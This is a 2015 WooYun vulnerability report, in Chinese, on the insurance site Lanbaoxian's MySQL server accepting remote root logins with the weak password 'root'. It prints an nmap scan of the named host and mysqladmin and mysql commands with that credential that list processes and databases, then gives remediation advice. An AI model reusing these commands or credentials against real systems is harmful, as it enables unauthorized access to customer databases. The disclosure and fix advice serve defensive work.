{"id": 26086, "wybug_id": "wooyun-2015-0129650", "wybug_title": "懒保险官网服务器mysql弱口令", "wybug_corp": "懒保险", "wybug_author": "路人甲", "wybug_date": "2015-08-04 12:23", "wybug_open_date": "2015-09-18 12:24", "wybug_type": "服务弱口令", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  懒保险 （www.lanbaoxian.com） 官网服务器，开放mysql3306端口，但未作连接限制且root用户可以远程通过弱口令连接。此外通过IP反查发现此服务上还托管了 包括P2P网站在内“小贝贷”（http://xiaobeidai.com/）等多个网站，且共用此mysql，此外目标主机为windows服务器，稍加利用可致使整个服务器沦陷并导致多个网站被恶意控制。   漏洞证明：  nmap:\nmsf auxiliary(mysql_enum) > db_nmap --save -T4 -sT  www.lanbaoxian.com[*] Nmap: Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-27 11:18 CST[*] Nmap: Nmap scan report for www.lanbaoxian.com (182.92.242.42)[*] Nmap: Host is up (0.0055s latency).[*] Nmap: Not shown: 993 filtered ports[*] Nmap: PORT      STATE SERVICE[*] Nmap: 80/tcp    open  http[*] Nmap: 135/tcp   open  msrpc[*] Nmap: 444/tcp   open  snpp[*] Nmap: 445/tcp   open  microsoft-ds[*] Nmap: 3306/tcp  open  mysql[*] Nmap: 3389/tcp  open  ms-wbt-server[*] Nmap: 49154/tcp open  unknown[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds[*] Saved NMAP XML results to /root/.msf4/local/msf-db-nmap-20150727-4453-1tin1tc.xml\n#mysqladmin -h www.lanbaoxian.com -P 3306  -u root --password=root processlist\n+------+------+-----------------------+--------------+---------+------+-------+------------------+----------+| Id   | User | Host                  | db           | Command | Time | State | Info             | Progress |+------+------+-----------------------+--------------+---------+------+-------+------------------+----------+| 1390 | root | localhost:57296       | lanbaoxiandb | Sleep   | 2005 |       |                  | 0.000    || 1391 | root | localhost:57297       | lanbaoxiandb | Sleep   | 4295 |       |                  | 0.000    || 1397 | root | 218.205.168.17:44822  |              | Sleep   | 1702 |       |                  | 0.000    || 1406 | root | 114.247.103.217:50123 |              | Query   | 0    | init  | show processlist | 0.000    |+------+------+-----------------------+--------------+---------+------+-------+------------------+----------+\n# mysql -h www.lanbaoxian.com -P 3306  -u root --password=root <<EOF> show databases;> EOF\nDatabaseinformation_schemalanbaoxiandblanbaoxiantestlbxmydbmysqlolddbperformance_schematestwechatpaywxlbx\n   修复方案：  1.关闭不使用的端口2.限制root用户的remote连接3.修改root用户和相关口令4.此服务可能已经被利用，建议彻底排查系统用户和进程，最好进行服务器重建。PS:目标主机为阿里云的windows主机，应用和数据库公用，建议使用阿里的rds数据库将数据库服务分离。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}